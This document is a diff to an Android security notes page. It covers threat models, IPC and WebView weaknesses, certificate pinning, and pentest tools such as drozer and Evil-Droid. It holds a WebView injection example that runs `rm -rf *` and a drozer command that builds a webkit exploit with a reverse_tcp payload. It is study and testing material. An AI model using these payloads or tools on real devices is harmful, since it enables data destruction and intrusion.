@@ -22,15 +22,17 @@ permalink: /infosec/android-security.html
 
 ### Awesomness
 
+* [OWASP Mobile Security Testing Guide](https://sushi2k.gitbooks.io/the-owasp-mobile-security-testing-guide/content/)
+* [OWASP mobile security - Top 10](https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks)
+
 * [Best Practices for Security &amp; Privacy](https://developer.android.com/training/best-security.html) - google cheatsheet
 * [Google security tips](https://developer.android.com/training/articles/security-tips.html)
-* [OWASP mobile security - Top 10](https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks)
 
 <br>
 
 * [Anatomy of Android - internals, externals and all in between](https://anatomyofandroid.com/) - several articles
 
-## Articles
+### Articles
 
 * {:.dummy} [Spoofing and intercepting SIM commands through STK framework](http://blog.0xb.in/2015/08/spoofing-and-intercepting-sim-commands.html?view=sidebar) - (Android 5.1 and below) (CVE-2015-3843)
 * {:.dummy} [Google Chrome for Android: UXSS and Credential disclosure](http://blog.0xb.in/2012/10/google-chrome-for-android-uxss-and.html)
@@ -50,14 +52,14 @@ permalink: /infosec/android-security.html
     - used for personal purposes
     - used for work purposes
 
-- contain a lot of valuable data (passwords from enterprise, from mail, from banks, OTP, ...)
+- contain a lot of *valuable* data (passwords from enterprise, from mail, from banks, OTP, ...)
 - use wireless technologies: sim, Wifi, NFC, Bluetooth
 
 *STK (SIM Toolkit) - is a standard of the GSM system which enables the Subscriber Identity Module (SIM) to initiate actions. SIM can write text to mobile, ask question to user, make a call, etc. It also can contain java apps (JavaCard).*
 
 ### Intruder model
 
-- hacker can have your telephone
+- hacker can obtain your telephone
 - hacker succesfully installed app into your telephone
 - hacker is somewhere near you and can communicate only via wireless technologies
 
@@ -93,6 +95,12 @@ Applications is installed to `/data/data/app_name`; `/mnt/sdcard` - removable st
 - an application framework (activity manager, window manager, content providers, ...)
 - application software running inside the application framework
 
+<div class="spoiler"><div class="spoiler-title" markdown="1">
+***Android architecture*** - [What is the architecture of an android app?](https://www.quora.com/What-is-the-architecture-of-an-android-app)
+</div><div class="spoiler-text" markdown="1">
+![]({{ "/resources/Android-architecture.jpg"  | prepend: site.baseurl }})
+</div>
+</div>
 
 #### System startup
 
@@ -256,20 +264,19 @@ Application:
 
     - analyse traffic
 
-        - several frameworks for "comfort" can approve any self-signed cert, or developer can forget to check for matching sertificate domain to server domain, etc.
+        - several frameworks for "comfort" can approve any self-signed cert, or developer can forget to check matching of certificate domain and server domain, etc.
 
         - use signed certificates (signed with CA, not expired, not recalled, with correct domain names)
 
             can be bypassed for reverse engineering, by adding your own root CA
 
-        - use pinned certificates (checking if certificate from server matches sertificate stored in application (hardcoded in code or in its resources))
+        - use pinned certificates (checking if certificate from server matches certificate stored in application (hardcoded in code or in its resources))
 
-            - defends from CA certificate being compromised, or from adding hackers certificate to the list of trusted certificates <br>
-
-            - demand application update for certificate update
+            - defends from CA certificate being compromised, or from adding malicious certificate to the list of trusted certificates <br>
+            - requires application update for certificate update
             - hard (but possible) to bypass for reverse engineering *(SSLunpinning, android-ssl-bypass, Android-SSL-TrustKiller)*
 
-            *In android version 4.4 SSLunpinning works good*
+            *In android version 4.4 SSLunpinning works OK*
 
         - *all* trafic must be encrypted, *NO* exclusions (such as advertisments, news, social network, telemetry, etc.)
 
@@ -279,10 +286,10 @@ Application:
 
 - **IPC** - Interprocess communication
 
-    - **Content providers** (allow to call functionality of application (sometimes functionality can be critical))
+    - **Content providers** (allows to call application's functionality (sometimes functionality can be critical))
 
         android < 4.1 - always exported
-        android > 4.1 - exported on developer instructions
+        <br> android > 4.1 - exported on developer instructions
 
         <br>
 
@@ -290,7 +297,7 @@ Application:
 
         - application signature must be from the same developer
         - by application name
-        - ask user (of course users always tap *yes*)
+        - ask user (obviously users always tap *yes*)
 
         When accessing a content provider, use parameterized query methods such as query(), update(), and delete() to avoid potential SQL injection from untrusted sources.
 
@@ -304,11 +311,11 @@ Application:
     - intent data must be validated
 
 
-- After getting a broadcast intent you must to make sure, from whom you got it.
+- After getting a broadcast intent you must get sure, whom it came from.
 
-    Before sending  broadcast intent you must be sure, that target component was not replace by malicious content. <br>
+    Before sending  broadcast intent you must got sure the target component has not been replaced by malicious content. <br>
 
-    The commands which require user intercation are placed in a queue (e.g. question from sim card). So after getting answer from user through broadcast intent you must be confident whose question user answered your or the malicious hackers answer just before your which send the same broadcast intent, e.g. [sim spoofing](http://blog.0xb.in/2015/08/spoofing-and-intercepting-sim-commands.html)
+    Commands requiring user interaction are placed in a queue (e.g. requests from sim card). Therefore after getting answer from a user via broadcast intent you can not be confident if the user has replied to exactly your's request. There is a possibility attacker pushed his own malicious request in a queue just before you did. e.g. [sim spoofing](http://blog.0xb.in/2015/08/spoofing-and-intercepting-sim-commands.html)
 
 
 - **Task activity hijacking** ([paper](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-ren-chuangang.pdf))
@@ -320,7 +327,7 @@ Application:
     - no real mitigation way
 
 
-- application **android:debuggable** - enables to attach to process with jdb (java debugger) and gives some privileges under process (run-as, etc.).
+- application **android:debuggable** - permits to attach to process with jdb (java debugger) and gain some privileges under process (run-as, etc.).
 <br>&nbsp;
 
 
@@ -333,9 +340,9 @@ Application:
         - setJavaScriptEnabled();
         - addJavaScriptInterface();
         
-        if we can inject into javascript our code we have RCE, e.g.
+        in case we can inject into javascript our code we got RCE, e.g.
 
-        `JavaObject.getClass().forname(“java.lang.Runtime”).getMethod(“getRuntime”, , null).invoke(null,null).exec([“/system/bin/sh”,”rm”,”-rf”,”*”])`
+        `JavaObject.getClass().forname("java.lang.Runtime").getMethod("getRuntime", , null).invoke(null,null).exec(["/system/bin/sh","rm","-rf","*"])`
 
 
 Information leaks:
@@ -344,7 +351,7 @@ Information leaks:
 
     (android < 4.1 (api 16)) - logcat can be read by any application (after api 16 each application has its own log)
 
-- application WebView (can store sensitive data just like web browser)
+- application WebView (can store sensitive data just like a web browser)
 
 Information leaks for application analysis:
 
@@ -372,7 +379,7 @@ Application can check if google play services installed on smartphone is up-to-d
 - NFC
 - Bluetooth (headset)
 
-SMS is **not encrypted** and **not authenticated** and can be intercepted, therefore is absolutely not secure (nor their content, nor sender).
+SMS is **not encrypted** and **not authenticated** and can be intercepted, therefore it is absolutely insecure (nor their content, nor sender).
 
 <br>
 
@@ -400,11 +407,11 @@ SMS is **not encrypted** and **not authenticated** and can be intercepted, there
 
     - Check output for `user`, `id`
 
-    - Check filesystem writes:
+    - Check filesystem rights:
 
         `/data` becomes readable
 
-        a lot of directores in `/` become writable
+        a lot of directores at `/` become writable
 
     Bypass for analysis:
 
@@ -426,11 +433,14 @@ SMS is **not encrypted** and **not authenticated** and can be intercepted, there
 
 ## Android security tools
 
+[Evil-Droid](https://github.com/M4sc3r4n0/Evil-Droid) - Evil-Droid Framework (framework that create & generate & embed apk payload to penetrate android platforms)
+
 [Android Tamer](https://androidtamer.com/) - distributive for android security penetration testing
 <br> [Koodous](https://docs.koodous.com/) - platform for Android malware research (looks like infosec ecosystem)
 
 * [Xposed framework (4PDA)](http://4pda.ru/forum/index.php?showtopic=425052) - hooking framework
-* [Frida](http://www.frida.re/) - framework for javascript injections (not only android related)
+* [Frida](http://www.frida.re/) - dinamic instrumentation toolkit - framework for javascript injections (not only android related)
+    <br> [пример использования Frida](https://xakep.ru/2018/03/19/android-frida/)
 
 <br>
 
@@ -440,8 +450,11 @@ SMS is **not encrypted** and **not authenticated** and can be intercepted, there
 <br>
 
 * [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) - Mobile Security Framework - an intelligent, all-in-one open source mobile application (Android/iOS/Windows) automated pen-testing framework capable of performing static, dynamic analysis and web API testing
+    <br> *[Garage4Hackers Webcast - Security Framework for Mobile Application Testing](https://youtu.be/CysfO6AZmo8) (youtube video)*
 
-*   [drozer](https://github.com/mwrlabs/drozer) - ***awesome*** security testing framework for Android
+* [APKiD](https://github.com/rednaga/APKiD) - Android application identifier for packers, protectors, obfuscators and oddities - PEiD for Android
+
+*   [drozer](https://github.com/mwrlabs/drozer) - security testing framework for Android
 
     Connecting:
 
@@ -486,7 +499,7 @@ SMS is **not encrypted** and **not authenticated** and can be intercepted, there
     $ drozer exploit build exploit.remote.webkit.nanparse –-payload weasel.reverse_tcp.armeabi --server 10.0.2.2:31415 --push-server 127.0.0.1:31415 --resource /home.html
     ```
 
-* [qark](https://github.com/linkedin/qark) - ***awesome*** tool designed to look for several security related Android application vulnerabilities
+* [qark](https://github.com/linkedin/qark) - tool designed to look for several security related Android application vulnerabilities
 
 Triggering intents ([`./adb shell am -h`](https://gist.github.com/tsohr/5711945)):
 
@@ -512,6 +525,7 @@ Enable proxy for emulators:
 
 * [Raccoon](https://github.com/onyxbits/Raccoon) - Google Play desktop client (allows to download android APK files) (look into `~/Documents/Racoon`)
 * [APK online downloader](https://apkpure.com/)
+* [APK tool android application](https://play.google.com/store/apps/details?id=org.spatialia.tool)
 
 #### APK disassemble
 
@@ -526,6 +540,7 @@ Enable proxy for emulators:
 #### Java decompilers
 
 * [jd-gui](https://github.com/java-decompiler/jd-gui/releases)
+    <br> running it under 9-th java (there can be some runtime error): `java --add-opens java.base/jdk.internal.loader=ALL-UNNAMED --add-opens jdk.zipfs/jdk.nio.zipfs=ALL-UNNAMED -jar jd-gui.jar`
 * [cfr](http://www.benf.org/other/cfr/)
 * [jad](http://www.javadecompilers.com/jad)
 * [dex2jar](https://github.com/pxb1988/dex2jar/releases) - dex->jar
@@ -609,6 +624,11 @@ Enable proxy for emulators:
 >   - Add into keystore specified certificate
 >       
 >       `keytool -importcert -v -trustcacerts -file "cert.der" -keystore "keystore.bks" -provider org.MyProvider -providerpath "my_app.jar" -storetype BKS -storepass testing`
+
+Simplifying OpenSSL certificate generation: `/usr/lib/ssl/misc/CA.pl` (debian/kali), `/etc/ssl/misc/CA.pl` (Arch)
+<br> `/etc/ssl/openssl.cnf` - default settings (change at least `dir`)
+
+[How to create my own certificate chain](https://superuser.com/questions/126121/how-to-create-my-own-certificate-chain) / [Generate certificate chains for testing java applications](https://web.archive.org/web/20100504162138/http://www.ibm.com/developerworks/java/library/j-certgen/)
 
 </div>
 </div>
